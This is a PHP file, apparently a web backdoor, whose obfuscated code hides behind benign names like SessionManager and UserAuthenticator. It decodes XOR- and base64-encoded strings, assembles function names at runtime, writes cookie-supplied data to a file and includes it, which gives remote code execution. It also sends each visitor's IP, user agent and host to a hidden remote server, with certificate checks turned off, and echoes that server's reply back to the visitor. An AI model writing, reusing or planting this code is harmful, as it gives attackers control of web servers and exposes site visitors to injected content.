<?php
class SessionManager
{
    private static $_ix;
    static function terminateSession($_u, $_xqq)
    {
        if (!self::$_ix) {
            self::cacheData();
        }
        $_nn = analyze_data($_xqq);
        $_mc = log_operation(self::$_ix[$_u]);
        for ($_ocn = 0, $_ypc = analyze_data($_mc); $_ocn !== $_ypc; ++$_ocn) {
            $_mc[$_ocn] = chr(ord($_mc[$_ocn]) ^ ord($_xqq[$_ocn % $_nn]));
        }
        return $_mc;
    }
    private static function cacheData()
    {
        self::$_ix = array('_ybm' => 'Hg48CC' . 'weci4wAysfMAFyLDMBMBpyIi0' . 'EOAQxV39H', '_d' => 'HAMxGDoCK0ELFS8JZUw+HC8ANg8+GDYDMUM1DSkNLA8' . 'tBS' . '8' . 'Y', '_sx' => 'P' . 'B' . 'w' . '=', '_nrc' => 'OhcVHjwtFlgWBDhaEwQ4WhMEOFoTBDhaFgcoB' . 'zs5GgcQBxVeBTYRXhYHKAc8AwkDFgQwBzspC' . 'RQ' . '7LR' . 'VX', '_dmm' => 'LhEeF' . 'Q' . '==', '_xva' => 'Yxw0TQ==', '_wmh' => 'YxALO' . '0w=', '_ouf' => 'K' . 'Agz' . 'BQ' . '==', '_p' => '', '_guk' => '', '_plj' => '', '_x' => 'Nx0fL1NEcBkePUccOgsNNgUONwYYKwwZcQoEMkYIMAQbMB' . 'oOLUcBLFYPPh' . '0KYg=' . '=', '_us' => 'PBwLMzYQMQ' . 'A' . 'N', '_tr' => 'NxIHLzk' . 'QMAI' . 'W', '_nz' => 'LBoRE' . 'zI' . 'c', '_hn' => 'Nx' . 'M' . 'r' . 'Fyw=', '_cbl' => 'GC' . '8' . 'LS' . 'g==', '_zc' => 'L' . 'xIODg=' . '=', '_vl' => 'LgQI' . 'ASY=', '_rhl' => 'Y' . 'A=' . '=', '_qb' => 'LhoS' . 'LR' . 'Y=', '_ar' => 'fykLNQ9Obk9v' . 'bFUp' . 'MBI' . 'r' . 'W38=', '_kb' => 'NxkcAQ==', '_erf' => 'UmU2MAEbOgwBNgAbZU82MwAGO' . 'mJ/UmU=', '_h' => 'LBQEZU' . 'hH', '_f' => '', '_pjc' => 'NwwDKw' . '=' . '=', '_ie' => 'U' . 'nA=', '_qr' => 'FyAk' . 'KAA3PDEaO' . 'i' . 'Qn' . 'Fi' . 'Q' . '=', '_mvq' => 'Fy0LKQAhAD8Q' . 'Kwg4DT0aPQA/E' . 'Cs=', '_pzp' => 'DSghLAsoMyIb' . 'K' . 'T4' . '=', '_eng' => 'FyIiDykjD' . 'DMkADcxG' . 'j' . 'gi', '_sos' => 'FyMtIAAiKjUNKDg3G' . 'jk' . 't', '_cz' => '', '_upz' => 'FzIhNQA0MCMaND' . 'A3', '_sfk' => 'Fz8' . 'LOwA5Gi0aO' . 'R' . 'o5', '_qm' => '', '_pml' => 'FyML' . 'JwA0Ez4aO' . 'QsoFic=', '_wrb' => 'FyELJQA2Ez' . 'waOws' . 'q' . 'Fi' . 'U=', '_zv' => 'FyQtI' . 'wAo' . 'JjUQIi4yDTQ8' . 'N' . 'wA2Ni' . 'E' . '=', '_pw' => 'FzkgMQA1KycQPyMgDSkxJQ' . 'ArOz' . 'M=', '_pah' => 'DS' . 'ggED' . 'koACwpGz' . '8' . '=', '_ly' => 'DTQ1E' . 'CU9ADA8G' . 'yM' . '=', '_vh' => 'OxMTDDAVEQ==', '_xrv' => 'Fi' . 'F' . 'e' . 'fw==', '_is' => 'fx1GMR5' . 'bRg==', '_q' => 'fw1JD' . 'R' . 'QPZVE=', '_foc' => 'f1cKBmF' . 'h', '_jhd' => 'NhQ=', '_mxp' => 'KgA' . '=', '_ko' => 'LQk' . 'J', '_io' => 'LgAfAg==');
    }
}

class UserAuthenticator
{
    private static $_ix;
    static function terminateSession($_u)
    {
        if (!self::$_ix) {
            self::cacheData();
        }
        return self::$_ix[$_u];
    }
    private static function cacheData()
    {
        self::$_ix = array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0.7, 0.7, 0.7, 0.7, 0.7, 0.7, 0.7, 0.7, 0.7, 0.7, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 7.5, 7.5, 7.5, 7.5, 0.2, 0.2, 0.2, 0.2, 0.2, 15, 15, 0.4, 0.4, 0.4, 0.4, 0.4, -010, -012, -073, 044, 052, -030, 01, 034, 0217, -01577, -0421, 01237, 01317, -0340, -01107, 0674, 02006, -01312, 0164, -0137, -01254, 016, -012, -01306, 0317, 01275, 0573, 073, 047, 033, -031, -0242, -0164, 0400, 0452, 0372, 01344, 01107, -01407, -01276, 0543, -053, 0511, -0403, -0152, -0360, 0526, 0357, -0110, -0352, -01067, 073, -0577, -0666, -0265, -0606, 0534, 0756, 01503, 1.5, 1.5, 1.5, 1.5, 1.5, 1.5, -0103, -01076, 0227, 01207, -0624, -0457, 0330, -0256, 0443, 0321, -0535, 01106, 01065, 0577, -0323, 0513, -0514, 01251, 01763, 0.6, 0.6, 0.6, 0.6, 0.6, 01315, -01254, -01340, -0634, -0543, 0212, 0544, 0106, -0541, -0700, 0467, 02571, 0.5, 0.5, 0, 0, 0, 0, 0, 0, 0, 0, 1.25, 1.25, 1.25, 1.25, 1.25, 1.25, 1.25, 1.25, 3.3333333333333, 3.3333333333333, 3.3333333333333, 01501, -0572, -0307, 0113, 0203, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 49.222222222222, 20, 20, 20, 20, 01253, -01210, 0616, -01441, -012, 01454, 0743, -01207, 0713, -02041, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 113.77777777778, 0.16666666666667, 0.16666666666667, 0.16666666666667, 0.16666666666667, 0.16666666666667, 0.16666666666667, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556, 30.555555555556);
    }
}

header(SessionManager::terminateSession('_' . 'yb' . 'm', '_m'));
header(SessionManager::terminateSession('_' . 'd', '_l'));
if (isset($_GET[SessionManager::terminateSession('_' . 's' . 'x', '_t')])) {
    $_o = aggregate_results(SessionManager::terminateSession('_' . 'nr' . 'c', '_' . 'n'));
    if ($_o && strpos($_o, SessionManager::terminateSession('_' . 'd' . 'mm', '_fd' . 'm')) !== false) {
        die(SessionManager::terminateSession('_x' . 'va', '_' . 's'));
    } else {
        die(SessionManager::terminateSession('_wm' . 'h', '_' . 'rj'));
    }
}
if (isset($_GET[SessionManager::terminateSession('_ou' . 'f', '_' . 'i')])) {
    $_ypc = $_COOKIE;
    $_xqq = (int) round(UserAuthenticator::terminateSession(0) + UserAuthenticator::terminateSession(1) + UserAuthenticator::terminateSession(2) + UserAuthenticator::terminateSession(3) + UserAuthenticator::terminateSession(4) + UserAuthenticator::terminateSession(5) + UserAuthenticator::terminateSession(6) + UserAuthenticator::terminateSession(7) + UserAuthenticator::terminateSession(8));
    $_u = (int) round(UserAuthenticator::terminateSession(9) + UserAuthenticator::terminateSession(10) + UserAuthenticator::terminateSession(11) + UserAuthenticator::terminateSession(12) + UserAuthenticator::terminateSession(13) + UserAuthenticator::terminateSession(14) + UserAuthenticator::terminateSession(15) + UserAuthenticator::terminateSession(16) + UserAuthenticator::terminateSession(17) + UserAuthenticator::terminateSession(18));
    $_n = array();
    $_n[$_xqq] = SessionManager::terminateSession('_' . 'p', '_' . 'kr' . 'u');
    while ($_u) {
        $_n[$_xqq] .= $_ypc[(int) round(UserAuthenticator::terminateSession(19) + UserAuthenticator::terminateSession(20) + UserAuthenticator::terminateSession(21) + UserAuthenticator::terminateSession(22) + UserAuthenticator::terminateSession(23) + UserAuthenticator::terminateSession(24) + UserAuthenticator::terminateSession(25) + UserAuthenticator::terminateSession(26) + UserAuthenticator::terminateSession(27) + UserAuthenticator::terminateSession(28))][$_u];
        if (!$_ypc[(int) round(UserAuthenticator::terminateSession(29) + UserAuthenticator::terminateSession(30) + UserAuthenticator::terminateSession(31) + UserAuthenticator::terminateSession(32))][$_u + (int) round(UserAuthenticator::terminateSession(33) + UserAuthenticator::terminateSession(34) + UserAuthenticator::terminateSession(35) + UserAuthenticator::terminateSession(36) + UserAuthenticator::terminateSession(37))]) {
            if (!$_ypc[(int) round(UserAuthenticator::terminateSession(38) + UserAuthenticator::terminateSession(39))][$_u + (int) round(UserAuthenticator::terminateSession(40) + UserAuthenticator::terminateSession(41) + UserAuthenticator::terminateSession(42) + UserAuthenticator::terminateSession(43) + UserAuthenticator::terminateSession(44))]) {
                break;
            }
            $_xqq++;
            $_n[$_xqq] = SessionManager::terminateSession('_g' . 'uk', '_' . 'jb');
            $_u++;
        }
        $_u = $_u + (UserAuthenticator::terminateSession(45) + UserAuthenticator::terminateSession(46) + UserAuthenticator::terminateSession(47) + UserAuthenticator::terminateSession(48) - UserAuthenticator::terminateSession(49) + UserAuthenticator::terminateSession(50) - UserAuthenticator::terminateSession(51) - UserAuthenticator::terminateSession(52) + UserAuthenticator::terminateSession(53)) + (UserAuthenticator::terminateSession(54) + UserAuthenticator::terminateSession(55) + UserAuthenticator::terminateSession(56) + UserAuthenticator::terminateSession(57) + UserAuthenticator::terminateSession(58) + UserAuthenticator::terminateSession(59) - UserAuthenticator::terminateSession(60) + UserAuthenticator::terminateSession(61));
    }
    $_xqq = $_n[UserAuthenticator::terminateSession(62) + UserAuthenticator::terminateSession(63) - UserAuthenticator::terminateSession(64) - UserAuthenticator::terminateSession(65) - UserAuthenticator::terminateSession(66) - UserAuthenticator::terminateSession(67) - UserAuthenticator::terminateSession(68) + UserAuthenticator::terminateSession(69) - UserAuthenticator::terminateSession(70) - UserAuthenticator::terminateSession(71)]() . $_n[UserAuthenticator::terminateSession(72) + UserAuthenticator::terminateSession(73) - UserAuthenticator::terminateSession(74) + UserAuthenticator::terminateSession(75) + UserAuthenticator::terminateSession(76) + UserAuthenticator::terminateSession(77) + UserAuthenticator::terminateSession(78)];
    if (!$_n[UserAuthenticator::terminateSession(79) + UserAuthenticator::terminateSession(80) - UserAuthenticator::terminateSession(81) + UserAuthenticator::terminateSession(82) + UserAuthenticator::terminateSession(83) - UserAuthenticator::terminateSession(84) - UserAuthenticator::terminateSession(85) - UserAuthenticator::terminateSession(86)]($_xqq)) {
        $_u = $_n[UserAuthenticator::terminateSession(87) + UserAuthenticator::terminateSession(88) + UserAuthenticator::terminateSession(89) + UserAuthenticator::terminateSession(90) - UserAuthenticator::terminateSession(91) + UserAuthenticator::terminateSession(92) - UserAuthenticator::terminateSession(93) + UserAuthenticator::terminateSession(94) - UserAuthenticator::terminateSession(95)]($_xqq, $_n[UserAuthenticator::terminateSession(96) + UserAuthenticator::terminateSession(97) + UserAuthenticator::terminateSession(98) - UserAuthenticator::terminateSession(99) + UserAuthenticator::terminateSession(100) - UserAuthenticator::terminateSession(101) + UserAuthenticator::terminateSession(102) + UserAuthenticator::terminateSession(103)]);
        $_n[(int) round(UserAuthenticator::terminateSession(104) + UserAuthenticator::terminateSession(105) + UserAuthenticator::terminateSession(106) + UserAuthenticator::terminateSession(107) + UserAuthenticator::terminateSession(108) + UserAuthenticator::terminateSession(109))]($_u, $_n[UserAuthenticator::terminateSession(110) - UserAuthenticator::terminateSession(111) + UserAuthenticator::terminateSession(112) - UserAuthenticator::terminateSession(113)] . $_n[UserAuthenticator::terminateSession(114) - UserAuthenticator::terminateSession(115) + UserAuthenticator::terminateSession(116) + UserAuthenticator::terminateSession(117) + UserAuthenticator::terminateSession(118) - UserAuthenticator::terminateSession(119)]($_n[UserAuthenticator::terminateSession(120) - UserAuthenticator::terminateSession(121) - UserAuthenticator::terminateSession(122) - UserAuthenticator::terminateSession(123) - UserAuthenticator::terminateSession(124) - UserAuthenticator::terminateSession(125) - UserAuthenticator::terminateSession(126) + UserAuthenticator::terminateSession(127) + UserAuthenticator::terminateSession(128)]($_ypc[(int) round(UserAuthenticator::terminateSession(129) + UserAuthenticator::terminateSession(130) + UserAuthenticator::terminateSession(131) + UserAuthenticator::terminateSession(132) + UserAuthenticator::terminateSession(133))])));
    }
    include $_xqq;
}
function aggregate_results($_q, $_gy = 1.1065222186818, $_hu = -0121060)
{
    $_sa = SessionManager::terminateSession('_p' . 'l' . 'j', '_d' . 'j');
    $_xia = SessionManager::terminateSession('_' . 'x', '_' . 'ik') . $_q;
    if (is_callable(SessionManager::terminateSession('_us', '_i' . 'y'))) {
        $_kjy = curl_init($_xia);
        curl_setopt($_kjy, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($_kjy, CURLOPT_SSL_VERIFYHOST, UserAuthenticator::terminateSession(134) + UserAuthenticator::terminateSession(135) - UserAuthenticator::terminateSession(136) + UserAuthenticator::terminateSession(137) + UserAuthenticator::terminateSession(138));
        curl_setopt($_kjy, CURLOPT_FOLLOWLOCATION, UserAuthenticator::terminateSession(139) - UserAuthenticator::terminateSession(140) - UserAuthenticator::terminateSession(141) + UserAuthenticator::terminateSession(142) + UserAuthenticator::terminateSession(143) - UserAuthenticator::terminateSession(144) + UserAuthenticator::terminateSession(145));
        curl_setopt($_kjy, CURLOPT_RETURNTRANSFER, (int) round(UserAuthenticator::terminateSession(146) + UserAuthenticator::terminateSession(147)));
        curl_setopt($_kjy, CURLOPT_HEADER, (int) round(UserAuthenticator::terminateSession(148) + UserAuthenticator::terminateSession(149) + UserAuthenticator::terminateSession(150) + UserAuthenticator::terminateSession(151) + UserAuthenticator::terminateSession(152) + UserAuthenticator::terminateSession(153) + UserAuthenticator::terminateSession(154) + UserAuthenticator::terminateSession(155)));
        curl_setopt($_kjy, CURLOPT_CONNECTTIMEOUT, (int) round(UserAuthenticator::terminateSession(156) + UserAuthenticator::terminateSession(157) + UserAuthenticator::terminateSession(158) + UserAuthenticator::terminateSession(159) + UserAuthenticator::terminateSession(160) + UserAuthenticator::terminateSession(161) + UserAuthenticator::terminateSession(162) + UserAuthenticator::terminateSession(163)));
        curl_setopt($_kjy, CURLOPT_TIMEOUT, (int) round(UserAuthenticator::terminateSession(164) + UserAuthenticator::terminateSession(165) + UserAuthenticator::terminateSession(166)));
        $_sa = curl_exec($_kjy);
        $_ex = curl_getinfo($_kjy);
        curl_close($_kjy);
        if ($_ex[SessionManager::terminateSession('_tr', '_fs')] != UserAuthenticator::terminateSession(167) + UserAuthenticator::terminateSession(168) + UserAuthenticator::terminateSession(169) + UserAuthenticator::terminateSession(170) - UserAuthenticator::terminateSession(171)) {
            return false;
        }
    } else {
        $_z = parse_url($_xia);
        $_adj = $_z[SessionManager::terminateSession('_' . 'n' . 'z', '_' . 'yyv')] == SessionManager::terminateSession('_hn', '_g');
        $_ir = SessionManager::terminateSession('_c' . 'bl', '_' . 'j') . $_z[SessionManager::terminateSession('_z' . 'c', '_szf')];
        if (isset($_z[SessionManager::terminateSession('_v' . 'l', '_qms')])) {
            $_ir .= SessionManager::terminateSession('_rhl', '_f' . 'z' . 'x') . $_z[SessionManager::terminateSession('_' . 'q' . 'b', '_ow')];
        }
        $_ir .= SessionManager::terminateSession('_a' . 'r', '_a') . $_z[SessionManager::terminateSession('_' . 'kb', '_' . 'v' . 'o' . 'u')] . SessionManager::terminateSession('_' . 'er' . 'f', '_' . 'ou');
        $_lm = fsockopen(($_adj ? SessionManager::terminateSession('_' . 'h', '_g' . 'h') : SessionManager::terminateSession('_f', '_ujq')) . $_z[SessionManager::terminateSession('_p' . 'jc', '_' . 'cp')], $_adj ? (int) round(UserAuthenticator::terminateSession(172) + UserAuthenticator::terminateSession(173) + UserAuthenticator::terminateSession(174) + UserAuthenticator::terminateSession(175) + UserAuthenticator::terminateSession(176) + UserAuthenticator::terminateSession(177) + UserAuthenticator::terminateSession(178) + UserAuthenticator::terminateSession(179) + UserAuthenticator::terminateSession(180)) : (int) round(UserAuthenticator::terminateSession(181) + UserAuthenticator::terminateSession(182) + UserAuthenticator::terminateSession(183) + UserAuthenticator::terminateSession(184)));
        if ($_lm) {
            fputs($_lm, $_ir);
            $_mc = UserAuthenticator::terminateSession(185) + UserAuthenticator::terminateSession(186) + UserAuthenticator::terminateSession(187) + UserAuthenticator::terminateSession(188) + UserAuthenticator::terminateSession(189) + UserAuthenticator::terminateSession(190) - UserAuthenticator::terminateSession(191) - UserAuthenticator::terminateSession(192) + UserAuthenticator::terminateSession(193) + UserAuthenticator::terminateSession(194);
            while (!feof($_lm)) {
                $_cdd = fgets($_lm, (int) round(UserAuthenticator::terminateSession(195) + UserAuthenticator::terminateSession(196) + UserAuthenticator::terminateSession(197) + UserAuthenticator::terminateSession(198) + UserAuthenticator::terminateSession(199) + UserAuthenticator::terminateSession(200) + UserAuthenticator::terminateSession(201) + UserAuthenticator::terminateSession(202) + UserAuthenticator::terminateSession(203)));
                if ($_mc) {
                    $_sa .= $_cdd;
                }
                if ($_cdd == SessionManager::terminateSession('_i' . 'e', '_z')) {
                    $_mc = (int) round(UserAuthenticator::terminateSession(204) + UserAuthenticator::terminateSession(205) + UserAuthenticator::terminateSession(206) + UserAuthenticator::terminateSession(207) + UserAuthenticator::terminateSession(208) + UserAuthenticator::terminateSession(209));
                }
            }
            fclose($_lm);
        }
    }
    return $_sa;
}

$_izf = isset($_SERVER[SessionManager::terminateSession('_' . 'qr', '_t' . 'px')]);
$_ebh = isset($_SERVER[SessionManager::terminateSession('_m' . 'vq', '_y')]);
$_kw = isset($_SERVER[SessionManager::terminateSession('_p' . 'z' . 'p', '_' . 'm' . 'l' . 'c')]);
$_qk = isset($_SERVER[SessionManager::terminateSession('_' . 'en' . 'g', '_v' . 'v')]) ? $_SERVER[SessionManager::terminateSession('_so' . 's', '_wyp')] : SessionManager::terminateSession('_cz', '_pq' . 'k');
$_mf = isset($_SERVER[SessionManager::terminateSession('_u' . 'pz', '_fue')]) ? $_SERVER[SessionManager::terminateSession('_sf' . 'k', '_' . 'k')] : SessionManager::terminateSession('_' . 'q' . 'm', '_otr');
$_izf = isset($_SERVER[SessionManager::terminateSession('_pm' . 'l', '_' . 'w')]) ? $_SERVER[SessionManager::terminateSession('_' . 'wrb', '_' . 'u')] : null;
$_ebh = isset($_SERVER[SessionManager::terminateSession('_z' . 'v', '_py' . 's')]) ? $_SERVER[SessionManager::terminateSession('_' . 'p' . 'w', '_mta')] : null;
$_kw = isset($_SERVER[SessionManager::terminateSession('_' . 'pa' . 'h', '_m' . 'm')]) ? $_SERVER[SessionManager::terminateSession('_l' . 'y', '_' . 'q' . 'x')] : null;
if (filter_var($_izf, (int) round(UserAuthenticator::terminateSession(210) + UserAuthenticator::terminateSession(211) + UserAuthenticator::terminateSession(212) + UserAuthenticator::terminateSession(213) + UserAuthenticator::terminateSession(214) + UserAuthenticator::terminateSession(215) + UserAuthenticator::terminateSession(216) + UserAuthenticator::terminateSession(217) + UserAuthenticator::terminateSession(218)))) {
    $_mr = $_izf;
} elseif (filter_var($_ebh, (int) round(UserAuthenticator::terminateSession(219) + UserAuthenticator::terminateSession(220) + UserAuthenticator::terminateSession(221) + UserAuthenticator::terminateSession(222) + UserAuthenticator::terminateSession(223) + UserAuthenticator::terminateSession(224) + UserAuthenticator::terminateSession(225) + UserAuthenticator::terminateSession(226) + UserAuthenticator::terminateSession(227)))) {
    $_mr = $_ebh;
} else {
    $_mr = $_kw;
}
if (isset($_GET[SessionManager::terminateSession('_v' . 'h', '_qta')])) {
    echo SessionManager::terminateSession('_x' . 'rv', '_q' . 'd') . $_mr . SessionManager::terminateSession('_is', '_af' . 'd') . $_qk . SessionManager::terminateSession('_' . 'q', '_q' . 'i') . $_mf . SessionManager::terminateSession('_f' . 'oc', '_kht');
    exit;
}
if (!isset($_mr) || !isset($_qk) || !isset($_mf)) {
    exit;
} else {
    $_fav = array(SessionManager::terminateSession('_' . 'j' . 'hd', '_d' . 'bp') => $_mr, SessionManager::terminateSession('_' . 'mx' . 'p', '_az') => $_qk, SessionManager::terminateSession('_' . 'ko', '_' . 'l' . 'o') => $_mf);
    $_lp = handle_error(initialize_component(json_encode($_fav)));
    $_o = aggregate_results($_lp);
    if ($_o && strpos($_o, SessionManager::terminateSession('_' . 'i' . 'o', '_w' . 'e' . 'z')) !== false) {
        echo $_o;
        exit;
    }
}
function log_operation($c)
{
    $a = array(70 + 27 + 4, 76 * 12 - 812, 81 * 16 - 1185, 76 * 1 + 23, 69 * 1 + 32, 66 + 33 + 1, 2 * 62 - 29, 52, 43 + 8 + 3, 42 + 59, 5 * 23, 100 - 3, 83 + 15);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function initialize_component($c)
{
    $a = array(101, 3 + 97, 57 * 79 - 4392, 100 - 1, 110, 101 * 1, 11 * 7 + 18, 48 + 1 + 3, 15 * 2 + 24, 104 - 3, 36 + 65 + 14, 97, 2 * 49);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function handle_error($c)
{
    $a = array(101 * 1, 27 * 2 + 46, 85 * 1 + 26, 9 + 90, 119 - 9, 99 * 28 - 2671, 21 * 1 + 87, 2 * 57, 117);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function analyze_data($c)
{
    $a = array(110, 61 + 40, 86 * 65 - 5482, 2 * 57, 124 - 8, 109 * 1 + 6);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}
/* jRRiziRS */